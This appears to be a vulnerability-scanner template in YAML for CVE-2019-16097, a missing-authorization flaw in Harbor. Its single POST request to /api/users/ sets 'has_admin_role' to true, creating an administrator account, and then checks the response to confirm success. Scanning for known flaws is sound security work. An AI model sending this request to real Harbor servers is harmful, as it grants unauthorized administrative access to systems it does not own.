id: cve-2019-16097
info:
  name: Harbor Missing Authorization
  risk: High
params:
- user: sam11
- pass: password1
reference:
- https://www.cvebase.com/cve/2019/16097
requests:
- body: '{"email":"{{.user}}@gmail.com","has_admin_role":true,"password":"{{.pass}}","realname":"xxx","username":"{{.user}}"}'
  detections:
  - (StatusCode() == 204 || StatusCode() == 201) && StringSearch("response", "/api/users/")
  - StringSearch("response", "username has already")
  headers:
  - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101
      Firefox/55
  - Content-Type: application/json
  method: POST
  redirect: true
  url: '{{.BaseURL}}/api/users/'
